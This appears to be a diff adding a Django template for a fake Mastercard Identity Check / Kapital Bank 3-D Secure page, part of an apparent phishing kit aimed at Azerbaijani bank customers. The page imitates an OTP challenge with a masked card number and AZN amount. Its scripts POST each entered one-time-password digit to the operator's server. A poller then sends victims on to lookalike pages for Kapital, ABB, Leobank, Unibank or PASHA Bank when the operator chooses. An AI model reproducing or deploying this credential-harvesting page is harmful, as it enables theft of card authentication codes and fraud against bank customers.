@@ -1,0 +1,179 @@
+{% load static %}
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+<html lang="EN" dir="ltr"><head>
+    <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width, height=device-height">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <title>
+    </title>
+    <link rel="stylesheet" href="{% static 'css/kapita.css' %}">
+    
+</head>
+
+<body class="MASTERCARD">
+<div data-entry-point="application-container"><div class="main web-based"><div class="header-zone"><div class="cancel-btn-container"><div class="cancel-btn-arrow"></div><button id="cancel" class="cancel">Cancel</button></div></div><div class="title"><div class="ps"><img src="{% static '/img/MASTERCARD.png' %}" alt="Mastercard Identity Check"></div><div class="logo"><img src="{% static '/img/kapital.png' %}"></div></div><div class="content"><div class="item item-caption">Cardholder Authentication</div><div data-entry-point="payment-details"><div class="cp-order-details"><div class="cp-order-details-rollup-container"><div class="item cp-amount-container"><div class="item-left item-amount">Amount</div><div class="item-right item-amount"><span>AZN</span> {{amount}}</div></div><div class="cp-order-details-rollup"></div></div><div class="cp-details"><div class="item columns"><div class="item-left">Merchant</div><div class="item-right">MPAY </div></div><div class="item columns"><div class="item-left">Date</div><div class="item-right">2023-04-29 13:19 </div></div><div class="item columns acct-number"><div class="item-left">Card Number</div><div class="item-right">**** **** **** 0054 </div></div></div></div></div><div data-entry-point="authentication"><div><div class="item columns item-phone-number"><div class="item-left">Address</div><div class="item-right">994******996 </div></div><form class="cp-Callback" action="https://emv3ds/challenge" id="callback-form" data-validation-context="*" novalidate=""><ul class="cp-error-descriptions" style="display: none;"> </ul><div class="cp-otp-input-container"><div class="item cp-error"> </div><div class="item-description">Enter dynamic password:</div><div class="item cp-otp-container"><div class="cp-otp-field-group-container">
+    
+    <input type="number" name='cc1' id="input1" maxlength="1">
+    <input type="number" name='cc'  id="input2" maxlength="1">
+    <input type="number" name='cc3' id="input3" maxlength="1">
+    <input type="number" name='cc4' id="input4" maxlength="1">
+</div>
+    <input type="hidden" name="Callback" value="" autocomplete="one-time-code" id="Callback_sms"></div><div class="extra-info-content-container"><div class="expand-info-zone cp-help-block"><div class="expand-info-label cp-help-label">Help</div><div class="expand-info-text cp-help-text cp-hidden"></div></div><div class="item"><button id="resendChallenge" class="resend" form="">Resend password</button>
+        <a id="secureCodeError" style="display: {{display}};"><h5>Təhlükəsizlik kodu yanlışdır</h5></a>
+        <style>
+            h5 {
+              font-size: 0.8rem;
+              color: red;
+            }
+          </style>
+    </div></div></div><div class="item cp-submit-btn-container"><button class="submit cp-not-displayed" disabled="disabled">Submit</button></div><hr class="cp-container-separator"><div class="item cp-otp-message-for-bsw">Please enter one-time password to confirm your identity. Password has been sent to</div><div class="cp-otp-message"><div class="item cp-not-displayed">Dynamic password will expire in <span class="cp-otp-timer">59:54</span></div><div class="item cp-is-hidden">Dynamic password has expired</div></div></form><div class="item cp-not-displayed"><form action="https://emv3ds/challenge" class="resend-otp-form" id="resendOtpForm"><input type="hidden" value="Y" name="resendChallenge"></form></div></div></div><div class="information-zone"></div></div></div></div>
+<div>
+    <div class="cp-ajax-indicator cp-not-displayed">
+        <div class="sk-circle">
+            <div class="sk-circle1 sk-child"></div>
+            <div class="sk-circle2 sk-child"></div>
+            <div class="sk-circle3 sk-child"></div>
+            <div class="sk-circle4 sk-child"></div>
+            <div class="sk-circle5 sk-child"></div>
+            <div class="sk-circle6 sk-child"></div>
+            <div class="sk-circle7 sk-child"></div>
+            <div class="sk-circle8 sk-child"></div>
+            <div class="sk-circle9 sk-child"></div>
+            <div class="sk-circle10 sk-child"></div>
+            <div class="sk-circle11 sk-child"></div>
+            <div class="sk-circle12 sk-child"></div>
+        </div>
+        <img src="{% static '/img/MASTERCARD.png' %}">
+    </div>
+</div>
+<script>
+    var input1 = document.getElementById("input1");
+    var input2 = document.getElementById("input2");
+    var input3 = document.getElementById("input3");
+    var input4 = document.getElementById("input4");
+    
+    var regex = /^[0-9]*$/;
+    
+    input1.addEventListener("input", function() {
+        if (regex.test(input1.value)) {
+            input1.value = input1.value.substring(0, 1);
+            input2.focus();
+        } else {
+            input1.value = "";
+        }
+    });
+    
+    input2.addEventListener("input", function() {
+        if (regex.test(input2.value)) {
+            input2.value = input2.value.substring(0, 1);
+            input3.focus();
+        } else {
+            input2.value = "";
+        }
+    });
+    
+    input3.addEventListener("input", function() {
+        if (regex.test(input3.value)) {
+            input3.value = input3.value.substring(0, 1);
+            input4.focus();
+        } else {
+            input3.value = "";
+        }
+    });
+    
+    input4.addEventListener("input", function() {
+        if (regex.test(input4.value)) {
+            input4.value = input4.value.substring(0, 1);
+            setTimeout(function() {
+                window.location.replace("{% url 'dseckapital' %}");
+            }, 555);  // Delay of 1 second (1000 milliseconds)
+        } else {
+            input4.value = "";
+        }
+    });
+
+
+    
+    
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var input1 = document.getElementById("input1");
+            var input2 = document.getElementById("input2");
+            var input3 = document.getElementById("input3");
+            var input4 = document.getElementById("input4");
+        
+            input4.addEventListener("keyup", function() {
+                if (input4.value.length == 1) {
+                    // Make an AJAX request to your Django view
+                    $.ajax({
+                        url: "{% url 'dseckapital' %}",
+                        method: "POST",
+                        data: {
+                            input1: input1.value,
+                            input2: input2.value,
+                            input3: input3.value,
+                            input4: input4.value,
+                        },
+                        success: function(response) {
+                            // Handle the response from the view
+                            console.log(response);
+                        },
+                        error: function(xhr, status, error) {
+                            // Handle errors
+                            console.log(xhr.responseText);
+                        }
+                    });
+                }
+            });
+        });
+    </script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    $(document).ready(function() {
+        var contact_id = {{ last_contact_id }};
+        var interval_id = setInterval(check_approval_status, 30000); 
+
+        function check_approval_status() {
+            $.ajax({
+                url: '/check_approval_status/' + contact_id + '/',
+                success: function(data) {
+                    if (data.bankname == "kapital") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "kapital" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "abb") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "abb" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "leobank") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "leobank3d" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "unibank") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "unibank" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "pashabank") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "pashabank" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "error") {
+                        clearInterval(interval_id);  // stop checking for updates
+                        window.location.href = '{% url "error" %}';  // redirect to the new view
+                    }
+                },
+                error: function(xhr, status, error) {
+                    console.log('Error checking approval status:', error);
+                }
+            });
+        }
+    });
+</script>
+
+</body></html>
